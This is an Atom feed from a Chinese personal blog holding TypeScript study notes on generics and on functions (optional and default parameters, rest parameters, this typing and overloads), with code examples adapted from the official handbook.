<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>冷暖我自知</title>
  
  <subtitle>这个前端有点菜。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/TheNightElf/"/>
  <updated>2018-01-22T10:09:20.247Z</updated>
  <id>https://github.com/TheNightElf/</id>
  
  <author>
    <name>冷暖我自知</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Typescript学习日记(五)</title>
    <link href="https://github.com/TheNightElf/2018/01/30/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/30/Typescript学习日记（五）/</id>
    <published>2018-01-30T08:40:56.000Z</published>
    <updated>2018-01-22T10:09:20.247Z</updated>
    
    <content type="html"><![CDATA[<p>使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 <code>以自己的数据类型</code> 来使用组件。<br><a id="more"></a></p><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>这里直接使用 <code>typescript</code> 官方的例子<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入 arg: number 返回 arg: number</span></span><br><span class="line"><span class="comment">// 但是这只能处理 arg: number 这么一种情况</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>(<span class="params">arg: number</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>重载</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用重载来约束函数又会显得比较啰嗦</span></span><br><span class="line"><span class="comment">// 不写完又无法全面的进行类型检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>(<span class="params">arg: string</span>): <span class="title">string</span>;</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">identity</span>(<span class="params">arg: number</span>): <span class="title">number</span>;</span></span><br><span class="line"><span class="function">// 其它类型...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">identity</span>(<span class="params">arg</span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>泛型写法</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这句话的意思</span></span><br><span class="line"><span class="comment">// 声明 identity 函数并添加一个 类型变量 T</span></span><br><span class="line"><span class="comment">// 告诉它我传入了一个 参数类型 为 T 的参数</span></span><br><span class="line"><span class="comment">// 你不需要管我这个 T 传递的是什么类型</span></span><br><span class="line"><span class="comment">// 只要帮我检查返回值的类型也是 T 就行了</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方式</span></span><br><span class="line"><span class="comment">// 1. 传入 T 的类型</span></span><br><span class="line"><span class="keyword">let</span> output = identity&lt;string&gt;(<span class="string">'str'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 直接调用，借助类型推断来判断 T 的类型</span></span><br><span class="line"><span class="keyword">let</span> output = identity(<span class="string">'str'</span>);</span><br></pre></td></tr></table></figure><p>这就是典型的泛型函数，不同于 <code>any</code> 它不会丢失类型信息。<br>但是在使用泛型变量的时候，我们必须要注意的是泛型变量 <code>T</code> 指的是所有类型。必须确定它能访问的函数和属性，否则会报错。<br>对于添加变量类型被命名为 <code>T</code> 是一种成俗的约定；当然我们也可以定义成别的，只要前后能够统一就行。</p><h4 id="泛型类型"><a href="#泛型类型" class="headerlink" title="泛型类型"></a>泛型类型</h4><p><strong>泛型接口</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface TI &#123;</span><br><span class="line">    &lt;T&gt;(arg: T): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output: TI = identity;</span><br></pre></td></tr></table></figure><p>我们还可以将泛型变量 <code>T</code> 放在 <code>interface</code> 上，从而省略内部的泛型变量 <code>T</code>;<br>官方对这一段内容写了一大篇，我没感觉出有多大用处。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface TI&lt;T&gt; &#123;</span><br><span class="line">    (arg: T): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output: TI&lt;number&gt; = identity;</span><br></pre></td></tr></table></figure><p><strong>泛型约束的继承使用</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">interface L &#123;</span><br><span class="line">    length: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泛型变量 T 继承自接口 L</span></span><br><span class="line"><span class="comment">// 泛型变量 T 必定含有一个 length 属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span> <span class="title">extends</span> <span class="title">L</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arg.length)</span><br><span class="line">    <span class="keyword">return</span> arg.length</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">identity(<span class="number">3</span>); <span class="comment">// -&gt; error，现在泛型函数 identity 的参数被 L 约束</span></span><br><span class="line"></span><br><span class="line">identity(&#123;<span class="attr">value</span>: <span class="number">3</span>, <span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// -&gt; success</span></span><br></pre></td></tr></table></figure><p><strong>在泛型约束中使用类型参数</strong><br>这里直接引用官方的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProperty</span>(<span class="params">obj: T, key: K</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line">getProperty(x, <span class="string">"a"</span>); <span class="comment">// -&gt; success</span></span><br><span class="line">getProperty(x, <span class="string">"m"</span>); <span class="comment">// -&gt; error，x 里面没有 'm' 这个 key</span></span><br></pre></td></tr></table></figure><p><strong>在泛型里使用类类型</strong><br>这里直接引用官方的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BeeKeeper</span> </span>&#123;</span><br><span class="line">    hasMask: boolean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZooKeeper</span> </span>&#123;</span><br><span class="line">    nametag: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    numLegs: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bee</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    keeper: BeeKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    keeper: ZooKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// createInstance </span></span><br><span class="line"><span class="comment">// 参数: c: new () =&gt; A 指 参数c 为一个 可以实例化的构造函数</span></span><br><span class="line"><span class="comment">// 且实例化之后的函数类型被 变量类型 A</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createInstance</span>&lt;<span class="title">A</span> <span class="title">extends</span> <span class="title">Animal</span>&gt;(<span class="params">c: new (</span>) =&gt; <span class="title">A</span>): <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">createInstance(Lion).keeper.nametag;</span><br><span class="line">createInstance(Bee).keeper.hasMask;</span><br></pre></td></tr></table></figure><h4 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    prop: T;</span><br><span class="line">    add: <span class="function">(<span class="params">x: T, y: T</span>) =&gt;</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> d = <span class="keyword">new</span> Demo&lt;number&gt;();</span><br><span class="line">d.prop = <span class="number">10</span>;</span><br><span class="line">d.add = <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还是老样子</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 &lt;code&gt;以自己的数据类型&lt;/code&gt; 来使用组件。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(四)</title>
    <link href="https://github.com/TheNightElf/2018/01/27/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/27/Typescript学习日记（四）/</id>
    <published>2018-01-27T03:58:26.000Z</published>
    <updated>2018-01-22T08:41:19.175Z</updated>
    
    <content type="html"><![CDATA[<p>本文将会介绍 <code>typescript</code> 中函数的相关内容。<br><a id="more"></a></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><p>此处略过。</p><h4 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h4><p>在函数定义的时候我们可以为函数指定 <code>参数类型</code> 与 <code>返回类型</code>。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定 add 函数接受两个 number 类型的参数x,y，返回一个 number 类型的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: number, y: number</span>) :<span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这种写法是 <code>typescript</code> 中最常见的函数类型写法，不过这是一种 <code>简写写法</code>。</p><p><strong>完整写法：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> add: </span><br><span class="line">    <span class="comment">//       这是 参数类型 部分         =              这是 返回值类型 部分</span></span><br><span class="line">    (x: number, <span class="attr">y</span>: number) =&gt; number = <span class="function"><span class="keyword">function</span> (<span class="params">x: number, y: number</span>): <span class="title">number</span> </span>&#123; <span class="keyword">return</span> x + y &#125;</span><br><span class="line">    <span class="comment">// (baseValue: number, increase: number) =&gt; number = function (x: number, y: number): number &#123; return x + y &#125;</span></span><br></pre></td></tr></table></figure><p>有没有发现原本简单明了的函数表达式变的更加难以理解了?没关系，定义函数的时候还是可以使用 <code>简写写法</code>，<code>typescript</code> 会自动帮我们转化。</p><p><strong>类型推导</strong><br>非常简单，不再叙述，<a href="https://www.tslang.cn/docs/handbook/functions.html" target="_blank" rel="noopener">详见这里</a>。</p><h4 id="可选参数与默认参数"><a href="#可选参数与默认参数" class="headerlink" title="可选参数与默认参数"></a>可选参数与默认参数</h4><p>看过前面 <code>interface</code> 的可选形式，对这里函数的可选形式应该不会陌生，它们的表现形式完全一样。至于默认参数，写过 <code>es6</code> 函数语法的应该已经非常熟悉了。</p><p><strong>可选参数</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yourName</span>(<span class="params">firstName: string, lastName?: string</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lastName) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;firstName&#125;</span> <span class="subst">$&#123;firstName&#125;</span>`</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> firstName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yourName(); <span class="comment">// -&gt; error，最少传入一个参数</span></span><br><span class="line">yourName(<span class="string">'Carl'</span>); <span class="comment">// -&gt; success, 'Carl'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="string">'Carl'</span>); <span class="comment">// success, 'Mr. Carl'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="string">'Carl'</span>, <span class="string">'Jhon'</span>); <span class="comment">// error, 参数太多</span></span><br></pre></td></tr></table></figure></p><p><strong>默认参数</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要注意的是 参数位置 不能更改</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yourName</span>(<span class="params">firstName: string, lastName = <span class="string">'Jhon'</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;firstName&#125;</span> <span class="subst">$&#123;firstName&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yourName(); <span class="comment">// -&gt; error，最少传入一个参数</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>); <span class="comment">// -&gt; success， 'Mr. Jhon'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="literal">undefined</span>); <span class="comment">// -&gt; success， 'Mr. Jhon'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="string">'Carl'</span>); <span class="comment">// -&gt; success， 'Mr. Carl'</span></span><br></pre></td></tr></table></figure></p><h4 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h4><p>剩余参数使用的是 <code>es6</code> 的 <code>rest剩余参数</code> 语法(没有使用过的人可以点击<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Rest_parameters" target="_blank" rel="noopener">这里</a>查看)。<code>typescript</code> 中的 <code>剩余参数</code> 的使用方式和 <code>es6</code> 中完全一致。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: number, ...restArgs: number[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> total = x;</span><br><span class="line">    restArgs.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        total += item</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>); <span class="comment">// -&gt; 15</span></span><br></pre></td></tr></table></figure><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><p>关于 <code>this</code> 这里不说太多，网上关于它的文章太多了。<br>关于使用 <code>箭头函数</code> 对 <code>this</code> 的影响可以查看我前面写的一片文章<a href="https://thenightelf.github.io/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">箭头函数</a>;</p><p><code>typescript</code> 中对于函数 <code>this</code> 的处理放在了参数中进行约束。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">interface Card &#123;</span><br><span class="line">    suit: string;</span><br><span class="line">    card: number;</span><br><span class="line">&#125;</span><br><span class="line">interface Deck &#123;</span><br><span class="line">    suits: string[];</span><br><span class="line">    cards: number[];</span><br><span class="line">    createCardPicker(<span class="keyword">this</span>: Deck): <span class="function"><span class="params">()</span> =&gt;</span> Card;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> deck: Deck = &#123;</span><br><span class="line">    suits: [<span class="string">"hearts"</span>, <span class="string">"spades"</span>, <span class="string">"clubs"</span>, <span class="string">"diamonds"</span>],</span><br><span class="line">    cards: <span class="built_in">Array</span>(<span class="number">52</span>),</span><br><span class="line">    <span class="comment">// 在参数中约定 this 为 Deck 类型</span></span><br><span class="line">    createCardPicker: <span class="function"><span class="keyword">function</span>(<span class="params">this: Deck</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> pickedCard = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">52</span>);</span><br><span class="line">            <span class="keyword">let</span> pickedSuit = <span class="built_in">Math</span>.floor(pickedCard / <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">suit</span>: <span class="keyword">this</span>.suits[pickedSuit], <span class="attr">card</span>: pickedCard % <span class="number">13</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cardPicker = deck.createCardPicker();</span><br><span class="line"><span class="keyword">let</span> pickedCard = cardPicker();</span><br><span class="line"></span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard.card + <span class="string">" of "</span> + pickedCard.suit);</span><br></pre></td></tr></table></figure><h4 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h4><p>不同于 <code>javascript</code> 的函数重载，<code>typescript</code> 中重复的对于一个函数进行定义，只要 <code>参数与返回值类型</code> 不同，就不会相互覆盖。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">say(); <span class="comment">// -&gt; hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typescript</span></span><br><span class="line"><span class="comment">// 官方的例子比较直接，这里直接使用官方的例子</span></span><br><span class="line"><span class="keyword">let</span> suits = [<span class="string">"hearts"</span>, <span class="string">"spades"</span>, <span class="string">"clubs"</span>, <span class="string">"diamonds"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于函数 pickCard 的参数与返回值进行约束</span></span><br><span class="line"><span class="comment">// 约束参数类型为 &#123;suit: string; card: number; &#125;[] 类型时，返回值类型为 number</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickCard</span>(<span class="params">x: &#123;suit: string; card: number; &#125;[]</span>): <span class="title">number</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// 约束参数类型为 <span class="title">number</span> 类型时，返回值类型为 </span>&#123;suit: string; card: number; &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickCard</span>(<span class="params">x: number</span>): </span>&#123;suit: string; card: number; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主体处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickCard</span>(<span class="params">x</span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x == <span class="string">"object"</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> pickedCard = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * x.length);</span><br><span class="line">        <span class="keyword">return</span> pickedCard;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> x == <span class="string">"number"</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> pickedSuit = <span class="built_in">Math</span>.floor(x / <span class="number">13</span>);</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">suit</span>: suits[pickedSuit], <span class="attr">card</span>: x % <span class="number">13</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myDeck = [&#123; <span class="attr">suit</span>: <span class="string">"diamonds"</span>, <span class="attr">card</span>: <span class="number">2</span> &#125;, &#123; <span class="attr">suit</span>: <span class="string">"spades"</span>, <span class="attr">card</span>: <span class="number">10</span> &#125;, &#123; <span class="attr">suit</span>: <span class="string">"hearts"</span>, <span class="attr">card</span>: <span class="number">4</span> &#125;];</span><br><span class="line"><span class="keyword">let</span> pickedCard1 = myDeck[pickCard(myDeck)];</span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard1.card + <span class="string">" of "</span> + pickedCard1.suit);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pickedCard2 = pickCard(<span class="number">15</span>);</span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard2.card + <span class="string">" of "</span> + pickedCard2.suit);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// -&gt; error，没有一个重载的参数约束为 string</span></span><br><span class="line"><span class="keyword">let</span> pickedCard3 = pickCard(<span class="string">'15'</span>);</span><br><span class="line">alert(<span class="string">"card: "</span> + pickedCard3.card + <span class="string">" of "</span> + pickedCard3.suit);</span><br></pre></td></tr></table></figure></p><p><strong>这里需要注意的是</strong>：如果通过重载对函数进行约束之后，那么该函数只能接受重载的定义类型。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将会介绍 &lt;code&gt;typescript&lt;/code&gt; 中函数的相关内容。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(三)</title>
    <link href="https://github.com/TheNightElf/2018/01/22/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/22/Typescript学习日记（三）/</id>
    <published>2018-01-22T07:51:19.000Z</published>
    <updated>2018-01-22T04:00:53.450Z</updated>
    
